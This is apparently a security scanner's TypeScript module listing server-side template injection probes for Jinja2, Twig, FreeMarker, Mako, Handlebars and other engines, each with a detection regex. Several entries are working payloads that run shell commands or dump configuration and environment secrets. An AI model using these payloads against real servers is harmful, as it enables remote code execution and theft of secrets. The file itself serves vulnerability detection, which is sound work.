export interface SstiPayload {
  payload: string;
  patterns: RegExp[];
  engine: string;
}

// — 1. Polyglot / universal (error-triggering probe) —
const POLYGLOT: SstiPayload[] = [
  {
    payload: `$\{{<%[%'"}}%\\.`,
    patterns: [
      /TemplateSyntaxError/i,
      /TemplateError/i,
      /TemplateException/i,
      /Parse error/i,
      /SyntaxError/i,
    ],
    engine: "Unknown",
  },
];

// — 2. Jinja2 (Python) —
const MATH_49 = /(?<!\d)49(?!\d)/;
const JINJA2: SstiPayload[] = [
  { payload: "{{7*7}}", patterns: [MATH_49], engine: "Jinja2" },
  { payload: "{{7*'7'}}", patterns: [/7{7,}/], engine: "Jinja2" },
  {
    payload: "{{config}}",
    patterns: [/SECRET_KEY/i, /DEBUG/i, /<Config\s/i],
    engine: "Jinja2",
  },
  {
    payload: "{{request.application.__globals__}}",
    patterns: [/__builtins__/, /__loader__/, /os\.environ/],
    engine: "Jinja2",
  },
];

// — 3. Twig (PHP) —
const TWIG: SstiPayload[] = [
  { payload: "{{7*7}}", patterns: [MATH_49], engine: "Twig" },
  { payload: "{{7*'7'}}", patterns: [MATH_49], engine: "Twig" },
  {
    payload: "{{_self.env}}",
    patterns: [/Twig\\Environment/i, /getExtension/i],
    engine: "Twig",
  },
  {
    payload: "{{['id']|filter('system')}}",
    patterns: [/uid=\d+/, /gid=\d+/],
    engine: "Twig",
  },
];

// — 4. FreeMarker (Java) —
const MATH_14 = /(?<!\d)14(?!\d)/;
const FREEMARKER: SstiPayload[] = [
  { payload: "${7*7}", patterns: [MATH_49], engine: "FreeMarker" },
  { payload: "${7+7}", patterns: [MATH_14], engine: "FreeMarker" },
  {
    payload: '${"freemarker.template.utility.Execute"?new()("id")}',
    patterns: [/uid=\d+/, /gid=\d+/],
    engine: "FreeMarker",
  },
];

// — 5. ERB (Ruby) —
const ERB: SstiPayload[] = [
  { payload: "<%= 7*7 %>", patterns: [MATH_49], engine: "ERB" },
  {
    payload: "<%= Dir.entries('/') %>",
    patterns: [/\["\."\s*,\s*"\.\."\s*,/, /etc/, /usr/],
    engine: "ERB",
  },
];

// — 6. EJS (Node.js) —
const EJS: SstiPayload[] = [
  { payload: "<%= 7*7 %>", patterns: [MATH_49], engine: "EJS" },
  {
    payload: "<%= global.process.env %>",
    patterns: [/\bPATH\b/, /\bHOME\b/, /\bNODE_ENV\b/],
    engine: "EJS",
  },
];

// — 7. Nunjucks (Node.js) —
const NUNJUCKS: SstiPayload[] = [
  { payload: "{{7*7}}", patterns: [MATH_49], engine: "Nunjucks" },
  {
    payload: "{{range(10)}}",
    patterns: [/0,\s*1,\s*2,\s*3/, /\[0,\s*1,\s*2/],
    engine: "Nunjucks",
  },
  {
    payload: '{{constructor.constructor("return this.process.env")()}}',
    patterns: [/\bPATH\b/, /\bHOME\b/, /\bNODE_ENV\b/],
    engine: "Nunjucks",
  },
];

// — 8. Pug/Jade (Node.js) —
const PUG: SstiPayload[] = [{ payload: "#{7*7}", patterns: [MATH_49], engine: "Pug" }];

// — 9. Thymeleaf (Java/Spring) —
const THYMELEAF: SstiPayload[] = [
  { payload: "[[${7*7}]]", patterns: [MATH_49], engine: "Thymeleaf" },
  {
    payload: "${T(java.lang.Math).random()}",
    patterns: [/0\.\d{5,}/],
    engine: "Thymeleaf",
  },
];

// — 10. Smarty (PHP) —
const SMARTY: SstiPayload[] = [
  { payload: "{7*7}", patterns: [MATH_49], engine: "Smarty" },
  { payload: '{math equation="7*7"}', patterns: [MATH_49], engine: "Smarty" },
];

// — 11. Velocity (Java) —
const VELOCITY: SstiPayload[] = [
  { payload: "#set($x=7*7)$x", patterns: [MATH_49], engine: "Velocity" },
];

// — 12. Mako (Python) —
const MAKO: SstiPayload[] = [
  { payload: "${7*7}", patterns: [MATH_49], engine: "Mako" },
  {
    payload: '<%import os%>${os.popen("id").read()}',
    patterns: [/uid=\d+/, /gid=\d+/],
    engine: "Mako",
  },
];

// — 13. Handlebars (Node.js) —
const HANDLEBARS: SstiPayload[] = [
  {
    payload:
      '{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require(\'child_process\').execSync(\'id\')"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}',
    patterns: [/uid=\d+/, /gid=\d+/],
    engine: "Handlebars",
  },
];

export const SSTI_PAYLOADS: SstiPayload[] = [
  ...POLYGLOT,
  ...JINJA2,
  ...TWIG,
  ...FREEMARKER,
  ...ERB,
  ...EJS,
  ...NUNJUCKS,
  ...PUG,
  ...THYMELEAF,
  ...SMARTY,
  ...VELOCITY,
  ...MAKO,
  ...HANDLEBARS,
];

export const SSTI_PAYLOAD_STRINGS: string[] = SSTI_PAYLOADS.map((p) => p.payload);
